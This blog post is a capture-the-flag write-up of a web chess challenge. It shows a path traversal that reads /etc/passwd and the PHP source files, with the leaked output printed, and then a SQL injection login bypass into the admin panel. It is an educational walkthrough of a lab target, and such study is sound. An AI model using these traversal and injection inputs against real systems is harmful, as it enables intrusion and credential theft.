---
layout: post
title:  "H4CK1NG G00GL3 - EP0C01"
subtitle: "Episode 000 - Challenge 01 - Playing Chess"
date:   2024-08-21 18:05:34 +0300
tags: [CTF, web-exploitation, reverse-engineering, research, google]
readtime: true
cover-img: [""]
thumbnail-img: "/assets/images/Hacking-Google/thumbnail.png"
share-img: "/assets/images/Hacking-Google/thumbnail.png"
---

A web site with some cool matrix-looking chess. Let's try to play a little.

I progressed well, even captured the queen and had the upper position. But then all the enemy peons turned into queens. What???

Lost :(

Let's play around. Clicking `START` doesn't work. It does navigate me to `index.php` which tells me it's PHP.

Reset my `PHPSESSID` cookie to reset the board.

Clicking on any piece sends a `GET` to `index.php` with the parameter `move_start={cell}`, possibly so that the server correctly shows the available moves.

Moving a piece will then send another `GET` parameter: `move_end=YToyOntpOjA7czoyOiJkMiI7aToxO3M6MjoiZDQiO30=`. Interesting, it's a base64, let's decode it:

```js
>> atob('YToyOntpOjA7czoyOiJkMiI7aToxO3M6MjoiZDQiO30=') 
<- 'a:2:{i:0;s:2:"d2";i:1;s:2:"d4";}'
```

Seems like it tells the server that we moved from cell `d2` to `d4`. Let's try to move a piece where we shouldn't: pressing on the queen sends `move_start=d1`, then we can send an encoding of `'a:2:{i:0;s:2:"d1";i:1;s:2:"c6";}'` and see where it gets us.

Sending a `GET` with the parameter `move_end=YToyOntpOjA7czoyOiJkMSI7aToxO3M6MjoiYzYiO30=` doesn't work, it simply ignores the move altogether.

Okay, so the website seems to correctly implement chess against an AI that can also cheat. Let's try other things.

There's a `Master Login` button. Redirects to `admin.php` with a simple username-password form.

Original HTML doesn't contain anything suspicious.

Back on the main page, there's difficulty. 3 options and on choosing sends `POST https://hackerchess-web.h4ck.ctfcompetition.com/index.php` with `diff={num}`. 

Tried sending with numbers outside of range (1-3), the board that is returned is the same starting one.

Viewing the HTML of the main page, I noticed this weird code that runs when `START` is pressed:

```js
function load_baseboard() {
  const url = "load_board.php"
  let xhr = new XMLHttpRequest()
  const formData = new FormData();
  formData.append('filename', 'baseboard.fen')

  xhr.open('POST', url, true)
  xhr.send(formData);
  window.location.href = "index.php";
}
```

It sends a file name to the server at the `load_board.php` endpoint.

Maybe we can make it so the server loads a board in a winning position for us? But it only receives a filename as input. Hmm...directory traversal maybe?

Let's rerun the code so the browser sends the request without the redirection and we can see the response:

```
Loading Fen: rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1
```

Okay, this indeed seems like a setup for the board in some form, where each letter represents a piece (p = peon for instance), and `8` indicates an empty row. Capitals represents white. Unsure what the rest means (`w KQkq - 0 1`), but we might be able to figure it out later.

Anyway, let's try to traverse by passing `../../etc/passwd` in the file name (assuming we're at the home directory of some user, going up twice should suffice).

Well, the server returns `500 Internal Server Error`, but the response includes interesting content

```
Loading Fen: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/sh
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
```

That's indeed `passwd`! Trying to aim for the best case scenario and access `shadow` yield an empty response. Possibly we're running as a low permission user. 

I tried accessing some well-known files for some info leaks, like `hostname`, `hosts`, `logs` directory, `/var/www/...` in some known Apache2 locations (using the `Server` header tells us the server runs `Apache/2.4.41 (Ubunut)`) but no luck.

I also assumed for a second the file name is appended into a shell command (instead of `file_read_contents`) and tried escaping, but any inclusion of special characters returns an empty error response.

But hey, if we can tell `load_board.php` the path `baseboard.fen` without additional detail, aren't we also running in the user directory? Let's try to read the `.php` files themselves.

Requesting `load_board.php` and we indeed can access it!

```php
Loading Fen: <?php
session_save_path('/mnt/disks/sessions');
session_start();
$fen = "";
if (isset($_POST['filename'])) {
  $fen = trim(file_get_contents($_POST['filename']));
  # XXX: Debug remove this
  echo 'Loading Fen: '. $fen;
}
else {
  die("Invalid request!");
}

use PChess\Chess\Piece;
require 'vendor/autoload.php';
use PChess\Chess\Chess;
use PChess\Chess\Output\UnicodeOutput;
use PChess\Chess\Output\HtmlOutput;
use PChess\Chess\Board;
use PChess\Chess\Output\Link;

function init_chess(string $fen)
{
      $chess = new Chess($fen);
      return $chess;
}

$_SESSION['board'] = serialize(init_chess($fen));
?>
``` 

Okay, so a board is initalized and saved in the session based on the contents of the file. A quick search for the imported files find [this open source PHP chess client](https://github.com/p-chess/chess). On the docs, we see that indeed, the `Chess` class can be passed an argument in [FEN](https://en.wikipedia.org/wiki/Forsyth%E2%80%93Edwards_Notation) notation. The Wiki page also explains the remaining text that we didn't understand:

```md
`w` : White to start
`KQkq` : Allow all Castling possibiilities
`-` : No en passant allowed
0 : Halfmove clock counting the number of halfmoves for a specific chess rule.
1 : Fullmove number counting the number of moves.
```

Alright, cool. Let's fetch `admin.php` and `index.php` too.

```php
<?php
/** index.php (shortened for brevity) */

session_save_path('/mnt/disks/sessions');
session_start();
if (isset($_GET['restart'])) {
    session_destroy();
    header("Location: ". "/");
}

if (isset($_POST['diff'])) {
   $diff = $_POST['diff'];
   $diff = (int) $diff;
   if ($diff >= 1 && $diff <= 3) {
	$_SESSION['diff'] = $diff;
   }
}
//var_dump($_SESSION);
?>
<html>
<head>
	<title>Hackerchess</title>
</head>
<body>
<center>
<div id="mainarea">
<div id="boardwrapper">
<?php

use PChess\Chess\Piece;

require 'vendor/autoload.php';
use PChess\Chess\Chess;
use PChess\Chess\Output\UnicodeOutput;
use PChess\Chess\Output\HtmlOutput;
use PChess\Chess\Board;
use PChess\Chess\Output\Link;

class Stockfish
{
    public $cwd = "./";
    public $binary = "/usr/games/stockfish";
    public $other_options = array('bypass_shell' => 'true');
    public $descriptorspec = array(
        0 => array("pipe","r"),
                1 => array("pipe","w"),
    );
    private $process;
    private $pipes;
    private $thinking_time;

    public function __construct()
    {
        $other_options = array('bypass_shell' => 'true');
        //echo "Stockfish options" . $_SESSION['thinking_time'];
        if (isset($_SESSION['thinking_time']) && is_numeric($_SESSION['thinking_time'])) {
            $this->thinking_time = $_SESSION['thinking_time'];
            echo '<!-- getting thinking time from admin.php -->';
            echo '<!-- setting thinking time to ' . $this->thinking_time . '-->';
        } else {
            $this->thinking_time = 10;
        }
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
    }
    public function passUci()
    {
        if (is_resource($this->process)) {
            fwrite($this->pipes[0], "uci\n");
            fwrite($this->pipes[0], "ucinewgame\n");
            fwrite($this->pipes[0], "isready\n");
        }
    }

    public function passPosition(string $fen)
    {
        fwrite($this->pipes[0], "position fen $fen\n");
        fwrite($this->pipes[0], "go movetime $this->thinking_time\n");
    }

    public function readOutput()
    {
        while (true) {
            usleep(100);
            $s = fgets($this->pipes[1], 4096);
            $str .= $s;
            if (strpos(' '.$s, 'bestmove')) {
                break;
            }
        }
        return $s;
    }

    public function __toString()
    {
        return fgets($this->pipes[1], 4096);
    }

    public function __wakeup()
    {
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
        echo '<!--'.'wakeupcalled'.fgets($this->pipes[1], 4096).'-->';
    }
}

function applyCheatsAI(Chess $chess)
{
    $firstSquare = Board::SQUARES['a8'];
    $lastSquare  = Board::SQUARES['h1'];
    for ($i = $firstSquare; $i <= $lastSquare; ++$i) {
        if ($i & 0x88) {
            $i += 7;
            continue;
        }
        $piece = $chess->board[$i];
        if ($piece == null) {
            continue;
        }
        if ($piece->isPawn() && $piece->getColor() !== Piece::WHITE) {
            $chess->board[$i] = new Piece(Piece::QUEEN, Piece::BLACK);
        }
    }
}

final class MyHtmlOutput extends HtmlOutput
{
    /**
     * @return array<string, array<int, string>>
     */
    private static function getAllowedMoves(Chess $chess, ?string $from = null): array
    {
        $moves = $chess->moves($from ? Board::SQUARES[$from] : null);
        $return = [];
        foreach ($moves as $move) {
            $return[$move->from][] = (string) $move->san;
        }

        return $return;
    }

    private static function isTurn(Chess $chess, Piece $piece): bool
    {
        return $piece->getColor() === $chess->turn;
    }

    /**
     * @param array<string, array> $allowedMoves Moves resulting from self::getAllowedMoves()
     */
    private static function canMove(string $from, int $to, array $allowedMoves): bool
    {
        $toSan = Board::algebraic($to);
        if (!isset($allowedMoves[$from])) {
            return false;
        }
        $cleanMoves = \array_map(static function (string $san) use ($from): string {
            $check = \substr($san, -1);
            $equalsPos = \strpos($san, '=');
            if ('+' === $check || '#' === $check) {
                $san = \substr($san, 0, -1);
            } elseif ('O-O-O' === $san) {
                $san = 'e1' === $from ? 'c1' : 'c8';
            } elseif ('O-O' === $san) {
                $san = 'e1' === $from ? 'g1' : 'g8';
            } elseif (false !== $equalsPos) {
                $san = \substr($san, 0, $equalsPos);
            }

            return \substr($san, -2);
        }, $allowedMoves[$from]);

        return \in_array($toSan, $cleanMoves, true);
    }

    public function generateLinks(Chess $chess, ?string $from = null, $identifier = null): array
    {
        $links = [];
        $allowedMoves = self::getAllowedMoves($chess, $from);
        /** @var int $i */
        foreach ($chess->board as $i => $piece) {
            $url = null;
            $class = null;
            $san = Board::algebraic($i);
            if (null === $from) {
                // move not started
                if (null !== $piece && isset($allowedMoves[$san]) && self::isTurn($chess, $piece)) {
                    $url = $this->getStartUrl($san, $identifier);
                }
            } elseif ($from !== $san) {
                // move started
                if (self::canMove($from, $i, $allowedMoves)) {
                    if (null !== $movingPiece = $chess->board[Board::SQUARES[$from]]) {
                        if ('p' === $movingPiece->getType() && (0 === Board::rank($i) || 7 === Board::rank($i))) {
                            $url = $this->getPromotionUrl($from, $san, $identifier);
                        } else {
                            $url = $this->getEndUrl($from, $san, $identifier);
                        }
                    }
                    $class = 'target';
                }
            } else {
                // restart move
                $url = $this->getCancelUrl($identifier);
                $class = 'current';
            }
            $links[$i] = new Link($class, $url);
        }

        return $links;
    }
    public function getStartUrl(string $from, $identifier = null): string
    {
        return '?move_start='.$from;
    }

    public function getEndUrl(string $from, string $to, $identifier = null): string
    {
        $data = base64_encode(serialize(array($from, $to)));
        return '?move_end='.$data;
    }

    public function getCancelUrl($identifier = null): string
    {
        return '?cancel';
    }

    public function getPromotionUrl(string $from, string $to, $identifier = null): string
    {
        return '?promotion='.$from.'/'.$to;
    }
}

function init_chess()
{
    $chess = new Chess();
    return $chess;
}

function list_moves_square(string $square, Chess $chess_state)
{
    $moves = $chess_state->moves();
    $valid_moves = array();
    foreach ($moves as $move) {
        #print ($move->from . " " . $square . "\n");
        if ($move->from == $square) {
            #print_r($move);
            array_push($valid_moves, $move);
        }
    }
    return $valid_moves;
}



if (isset($_SESSION['board']) && $_SESSION['board'] !== "") {
    //echo "Board already set?\n";
    //echo $_SESSION['board'];
    $chess = unserialize($_SESSION['board']);
} else {
    $chess = init_chess();
}

$output = new MyHtmlOutput();
if (isset($_GET['move_start'])) {
    echo $output->render($chess, $_GET['move_start']);
} elseif (isset($_GET['move_end'])) {
    $movei = unserialize(base64_decode($_GET['move_end']));
    if ($chess->turn == "b") {
      #XXX: this should never happen.
      $chess = init_chess();
      $_SESSION['board'] = serialize($chess);
      die('Invalid Board state. Refresh the page');
    }
    echo "<!-- XXX : Debug remove this ".$movei. "-->";
    $valid_moves = list_moves_square($movei[0], $chess);
    $invalid_move = True;

    foreach ($valid_moves as $move) {
        if ($move->to == $movei[1]) {
          $chess->move($move->san);
          $invalid_move = False;
        }
    }

    if (!$invalid_move) {
      $stockf = new Stockfish();
      $stockf->passUci();
      $stockf->passPosition($chess->fen());
      $move_s = $stockf->readOutput();
      $move_s = explode(" ", $move_s);
      $move_best = $move_s[1];
      //echo $move_best;;
      $bm_from = substr($move_best, 0, 2);
      $bm_to = substr($move_best, 2, 2);
      $chess->move(['from' => $bm_from, "to" => $bm_to]);
    }

    echo $output->render($chess);
    if ($chess->inCheckmate()) {
        if ($chess->turn != "b") {
            echo '<h1>You lost! Game Over!</h1>';
        } else {
            echo "<h1>ZOMG How did you defeat my AI :(. You definitely cheated. Here's your flag: ". getenv('REDIRECT_FLAG') . "</h1>";
        }
    }
} else {
    echo $output->render($chess);
}
$_SESSION["board"] = serialize($chess);
//echo $_SESSION['board'];
?>
</div>
<div id="movehistory">
<?php
$entries = $chess->getHistory()->getEntries();
?>
<h3>MOVES</h3>
<ul>
<?php
foreach ($entries as $entry) {
    echo '<li>';
    if ($entry->moveNumber == 7 && $_SESSION['cheats_enabled'] !== "0") {
        applyCheatsAI($chess);
        $_SESSION["board"] = serialize($chess);
    }
    echo  '<p id="moveno">'.$entry->moveNumber;
    echo '<p id="frommove">'. ' _ ' . $entry->move->from.'</p>';
    echo '<p id="tomove">'. ' _ ' .$entry->move->to.'</p>';
    //var_dump( $entry);
    echo "</li>";
}
?>
</ul>
</div>
</div>
</center>
</body>
```

```php
<?php
/** admin.php (shortened for brevity) */

session_save_path('/mnt/disks/sessions');
session_start();
$db_name = "forge";
/** mysql database username */
$db_user = "forge";
/** mysql database password */
$db_password = getenv('REDIRECT_DB_PASSWORD');
/** mysql hostname */
$db_host = getenv('REDIRECT_DB_HOST');
$conn = new mysqli($db_host, $db_user, $db_password, $db_name);
?>

<html>
<head>
	<title>Secret Admin Panel</title>
</head>
<body>
<?php
if (isset($_SESSION['isadmin']) && $_SESSION['isadmin'] == true) {
    ?>
	<h1>Change config of the Chess AI!</h1>
	<?php // echo $_SESSION['isadmin'];?>
	<form method="POST">
		Thinking Time: <input type="number" name="thinking_time" value="<?php echo $_SESSION['thinking_time']; ?>"><br/>
          AI Queen Cheats: <input type="radio" id="cheats_enabled" name="cheats_enabled" value="1"> <label for="cheats_enabled">Yes</label> <input type="radio" id="cheats_enabled" name="cheats_enabled" value="0"> <label for="cheats_enabled">No</label><!-- Currently set to: <?php echo $_SESSION['cheats_enabled']; ?> -->
		<input type="submit">
	</form>
	<?php
}
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

//var_dump($_SESSION);
if ($_SESSION['isadmin'] == true && isset($_POST['thinking_time']) && isset($_POST['cheats_enabled'])) {
    $_SESSION['thinking_time'] = $_POST['thinking_time'];
    $_SESSION['cheats_enabled'] = $_POST['cheats_enabled'];
}

if (isset($_POST['username']) && isset($_POST['password'])) {
    $query = sprintf("SELECT username FROM chess_ctf_admins WHERE username='%s' AND password='%s'", $_POST['username'], $_POST['password']);
    try {
        $result = $conn->query($query);
    } catch (mysqli_sql_exception $e) {
        echo($e);
    }
    $row = $result->fetch_assoc();
    if (count($row) < 1) {
        echo "Invalid Login!";
        $_SESSION['isadmin'] = false;
    } else {
        echo "Logged in successfully!";
        $_SESSION['isadmin'] = true;
        $page = $_SERVER['REQUEST_URI'];
        header("Location: ". $page);
    }
}
if (!isset($_SESSION['isadmin']) || $_SESSION['isadmin'] != true) {
    ?>
	<form method="post">
		username: <input type="text" name="username"><br>
		password: <input type="password" name="password"><br>
		<input type="submit">
	</form>
<?php
}
?>
</body>
</html>
```

That's a lot of code. Let's focus on what matters.

First, for some reason, when I queried `index.php`, I got 200 OK instead of an error. Odd.

Second, I reviewed the `index.php` code and wrote down some insights.

1. `GET` parameters handling

```php
if (isset($_GET['restart'])) {
    session_destroy();
    header("Location: ". "/");
}

if (isset($_POST['diff'])) {
   $diff = $_POST['diff'];
   $diff = (int) $diff;
   if ($diff >= 1 && $diff <= 3) {
	$_SESSION['diff'] = $diff;
   }
}
```

Turns out there's a restart `GET` parameter that resets the session, and the difficulty is saved to the session and validated successfully.

2. Stockfish wrapper

```php
class Stockfish
{
	// ...
    public $binary = "/usr/games/stockfish";
	// ...

    public function __construct()
    {
    	// ...
        if (isset($_SESSION['thinking_time']) && is_numeric($_SESSION['thinking_time'])) {
            $this->thinking_time = $_SESSION['thinking_time'];
            echo '<!-- getting thinking time from admin.php -->';
            echo '<!-- setting thinking time to ' . $this->thinking_time . '-->';
        } else {
            $this->thinking_time = 10;
        }
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
    }
    // ...
    public function passPosition(string $fen)
    {
        fwrite($this->pipes[0], "position fen $fen\n");
        fwrite($this->pipes[0], "go movetime $this->thinking_time\n");
    }
    // ...
}
```

It's a small class wrapper around a [Stockfish (open source Chess engine computing optimal moves)](https://github.com/official-stockfish/Stockfish) binary hosted at `/usr/games/stockfish`. The wrapper spawns a process and interfaces simple input/output with the binary by sending the current board in FEN format and getting the optimal move back.

One immediately interesting point is that a `thinking_time` session value that seems to be admin-controlled is passed to the binary. If I get control over it (maybe after getting admin access?), I can possibly alter the current board state for Stockfish and make it output suboptimal moves, though it depends on how the class parses Stockfish's responses.

3. Cheating!

```php
function applyCheatsAI(Chess $chess)
{
	// ...
    for ($i = $firstSquare; $i <= $lastSquare; ++$i) {
        if ($i & 0x88) {
            $i += 7;
            continue;
        }
        // ...
		if ($piece->isPawn() && $piece->getColor() !== Piece::WHITE) {
            $chess->board[$i] = new Piece(Piece::QUEEN, Piece::BLACK);
        }
	// ...
}
```

Well I didn't imagine. When applied, this changes all black peons to queens. There this odd `if` statement at the beginning that skips some cells.

However I don't know how cells are represented as number, but this check verifies that the top bits in every nibble of the cell number are not both enabled. Anyway, I should remember this if the cheating mechanism needs to be bypassed later.

4. HTML control

```php
final class MyHtmlOutput extends HtmlOutput
{
	// ...
}
```

Looks like they define an interface that can convert between the internal Chess objects (like PChess and Stockfish) and the data they need in the HTML, like the links on the board and the move list.

One interesting function I might be able to exploit later is `canMove` that decides whether a given move (possibly like that way I input it earlier) is valid or not.

5. Cheat no more

```php
if ($entry->moveNumber == 7 && $_SESSION['cheats_enabled'] !== "0") {
        applyCheatsAI($chess);
        $_SESSION["board"] = serialize($chess);
    }
```

Alright, so cheats are enabled on move 7. I need to win beforehand or find how to manipulate the `cheats_enabled` session flag.

6. Game loop

```php
// ...
} elseif (isset($_GET['move_end'])) {
    $movei = unserialize(base64_decode($_GET['move_end']));
	// ...
    echo "<!-- XXX : Debug remove this ".$movei. "-->";
    $valid_moves = list_moves_square($movei[0], $chess);
    $invalid_move = True;

    foreach ($valid_moves as $move) {
        if ($move->to == $movei[1]) {
          $chess->move($move->san);
          $invalid_move = False;
        }
    }

    if (!$invalid_move) {
      $stockf = new Stockfish();
      // ...
      $move_s = $stockf->readOutput();
      // ...
      $chess->move(['from' => $bm_from, "to" => $bm_to]);
  	}
  	// ...
  	if ($chess->inCheckmate()) {
        if ($chess->turn != "b") {
            echo '<h1>You lost! Game Over!</h1>';
        } else {
            echo "<h1>ZOMG How did you defeat my AI :(. You definitely cheated. Here's your flag: ". getenv('REDIRECT_FLAG') . "</h1>";
        }
    }
}
```

Alright, so the `move_end` parameter is simply unserialized as a PHP object and decoding. Let's use unserialize websites (like [this](https://www.unserialize.com)) to see what the value converts to.

```
>> unserialize(a:2:{i:0;s:2:"d1";i:1;s:2:"c6";})

Array
(
    [0] => d1
    [1] => c6
)
```

Alright, it's simply my move from and move to, like I guessed. The valid moves are calculated using Pchess in `list_moves_square`, so I don't have much hopes of defeating it.

Also, finally, it seems that unsurprisingly, winning the game nets you the flag that is saved in an environment variable.

After writing down those insights, that only good lead I have is getting admin access to manipulate Stockfish.

Naturally, I analyzed `admin.php` for some more insights about the code:

1. Setting admin parameters
```php
if (isset($_SESSION['isadmin']) && $_SESSION['isadmin'] == true) {
	<h1>Change config of the Chess AI!</h1>
	<form method="POST">
		Thinking Time: <input type="number" name="thinking_time" value="<?php echo $_SESSION['thinking_time']; ?>"><br/>
          AI Queen Cheats: <input type="radio" id="cheats_enabled" name="cheats_enabled" value="1"> <label for="cheats_enabled">Yes</label> <input type="radio" id="cheats_enabled" name="cheats_enabled" value="0"> <label for="cheats_enabled">No</label><!-- Currently set to: <?php echo $_SESSION['cheats_enabled']; ?> -->
		<input type="submit">
	</form>
}
```

It seems lhat luckily both the cheats_enabled and the thinking_time parameters can be altered in the admin panel. Now just to get access to it.

2. Logging as admin
```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $query = sprintf("SELECT username FROM chess_ctf_admins WHERE username='%s' AND password='%s'", $_POST['username'], $_POST['password']);
    try {
        $result = $conn->query($query);
    } catch (mysqli_sql_exception $e) {
        echo($e);
    }
    $row = $result->fetch_assoc();
    if (count($row) < 1) {
        echo "Invalid Login!";
        $_SESSION['isadmin'] = false;
    } else {
        echo "Logged in successfully!";
        $_SESSION['isadmin'] = true;
        $page = $_SERVER['REQUEST_URI'];
        header("Location: ". $page);
    }
}
```

This screams llike SQL injection as the input username and password are passed straight into the SQL SELECT query without sanitation. Moreover, the check for admin when logging in simply verifies that more than one row is returned from the SELECT query.

So, setting up the `username` parameter to `1' or '1'='1' --` and `password` to anything will result in the query string to look like this:

```sql
SELECT username FROM chess_ctf_admins WHERE username='1' or '1'='1' --' AND password='anything'
```

The `WHERE` clause will resolve to `true` for every row, since `'1'` is indeed equal to `'1'`. The `--` at the end makes sure that the remainder of the query is commented out and won't bother us.

Let's try:
```
username=1' OR '1'='1' --
password=test
```

The response is an 500 error. Hmm, maybe there's something I'm missing. It could be an odd reason regarding using comments in a query.

There a few tricks to avoid using comments, in this scenario it's easiest if I just input the `password` parameter to be `1' or '1'='1`, and the `username` to anything, the query string will still evaludate to true:

```sql
SELECT username FROM chess_ctf_admins WHERE username='anything' AND password='1' or '1'='1'
```

And...it works! Nice.

We can immediately disable cheating. As for the thinking time, I tried to set it to something other than an integer. Initially, I thought that to affect Stockfish's input, I need to be able to input line feeds (`\n`). 

```
thinking_time=1 \n isready
cheats_enabled=0
```

I got 200 OK. But the `thinking_time` input tag looks broken. 
I refreshed and looked at the returned HTML

```html
<form method="POST">
	Thinking Time: <input type="number" name="thinking_time" value="1 \n isready"><br/>
	AI Queen Cheats: <input type="radio" id="cheats_enabled" name="cheats_enabled" value="1"> <label for="cheats_enabled">Yes</label> <input type="radio" id="cheats_enabled" name="cheats_enabled" value="0"> <label for="cheats_enabled">No</label><!-- Currently set to: 0 -->
	<input type="submit">
 </form>
```

Looks like the edit worked. 

Being a bit too quick to solve this, I went to [Stockfish's command documentation](https://github.com/official-stockfish/Stockfish/wiki/UCI-&-Commands) and checked what the existing commands do (`uci`, `ucinewgame`, `isready`, `position fen` and `go movetime`). 

Unsurprising, they initialize a new game when the Stockfish class is instantiated, and every move the game is sent as a FEN and Stockfish is given (by default), 10 ms to run.

I quickly scrolled through all possible commands, and searched for something that will net me a win. Very quickly I move that, beside `movetime`, the `go` commands take a lot more options. One of which is `searchmoves`, which restricts the possible moves Stockfish looks at.

Great! I can just give it a single, silly move, and win via some quick [mate](https://en.wikipedia.org/wiki/Scholar's_mate). 

I need to make 4 moves, so I quick wrote down commands to restrict Stockfish to use the moves shown in the Scholar's mate Wikipage for the black player via the `thinking_time` parameter

```
1 searchmoves e7e5
1 searchmoves b8c6
1 searchmoves g8f6
```

I checked it locally downloaded version of Stockfish, and it worked like a charm.

I set up `thinking_time` to the first command via the admin panel and made a move.

...Stockfish played a totally different move to `e7e5`. What went wrong?

I recalled that the PHP prints the value of `thinking_time` within the `Stockfish` class when it succesfully edits it. The function is called when the class is instanciated, which happen every time I finish a move (`isset($_GET['move_end'])` is checked).

So I made another move to see the comment printed in the returned HTML and...nothing, no comment. I went back to the code and finally noticed the check I missed in my rush to break Stockfsih: `if (isset($_SESSION['thinking_time']) && is_numeric($_SESSION['thinking_time']))`.

So my input must be a numeric value.

My mind jumped straight to overcoming the check by inputting something that bypasses `is_numeric`, but a quick search verified the function is pretty airtight.

As a simple experiment, however, I decided to set up the thinking time to 1. Giving Stockfish such a small thinking window should make it easier to play against, right?

I set it up via the admin panel and started a game.

Made a normal King's Pawn opening. 

Stockfish moves the `g8` knight to `f6` - decent move. 

I moved the queen diagonally to threat the queen's peon. 

Stockfish moved the `a7` peon one step - okay, seems like the short thinking window has an impact, this is a silly move. 

I moved the white bishop to protect the queen for the last step.

Stockmove moved the same peon another step forward - ha!

One last move of my queen and the game's ended in a 4 move mate, and the challenge has given out its flag.

`ZOMG How did you defeat my AI :(. You definitely cheated.`